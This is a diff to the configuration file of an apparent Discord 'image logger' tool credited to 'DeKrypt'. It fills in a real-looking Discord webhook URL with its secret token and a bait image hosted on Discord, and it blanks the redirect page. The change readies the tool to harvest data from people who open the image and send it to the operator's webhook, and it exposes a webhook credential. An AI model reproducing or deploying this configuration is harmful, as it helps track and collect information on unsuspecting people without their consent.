@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",
-    "image": "", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1456886083307442207/3IXNAybKDYnfFnCDmP0wpK3Hihp-SGrcXMrffe2zITqaZ6Y9Um3ApvLsDI6XJ3tKFH-I",
+    "image": "https://media.discordapp.net/attachments/1456886061258113075/1457978110833197239/Ec0_ruDWAAIZIlF.png?ex=695df76d&is=695ca5ed&hm=b1f73acbafd6099a6b0d2914f5fbc45d42c7e7b0d0755d15df67c06f7e5d50dd&=&format=webp&quality=lossless&width=1624&height=1024", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "page": "" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
